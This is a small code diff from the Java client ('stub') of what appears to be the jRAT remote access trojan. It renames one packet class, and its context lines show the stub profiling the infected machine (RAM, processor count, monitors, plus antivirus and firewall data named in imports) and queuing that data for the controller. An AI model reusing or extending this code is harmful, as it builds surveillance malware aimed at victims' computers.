@@ -45,7 +45,7 @@ import se.jrat.stub.packets.outgoing.Packet47InitCountry;
 import se.jrat.stub.packets.outgoing.Packet61InitMonitors;
 import se.jrat.stub.packets.outgoing.Packet62InitDrives;
 import se.jrat.stub.packets.outgoing.Packet63InitRAM;
-import se.jrat.stub.packets.outgoing.Packet64InitAvailableProcessors;
+import se.jrat.stub.packets.outgoing.Packet64InitAvailableCores;
 import se.jrat.stub.packets.outgoing.Packet67LoadedPlugins;
 import se.jrat.stub.packets.outgoing.Packet69InitAntivirus;
 import se.jrat.stub.packets.outgoing.Packet70InitFirewall;
@@ -185,7 +185,7 @@ public class Connection implements Runnable {
 		int ram = (int) (((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize() / 1024L / 1024L);
 		addToSendQueue(new Packet63InitRAM(ram));
 
-		addToSendQueue(new Packet64InitAvailableProcessors(Runtime.getRuntime().availableProcessors()));
+		addToSendQueue(new Packet64InitAvailableCores(Runtime.getRuntime().availableProcessors()));
 
 		addToSendQueue(new Packet61InitMonitors(GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()));
 
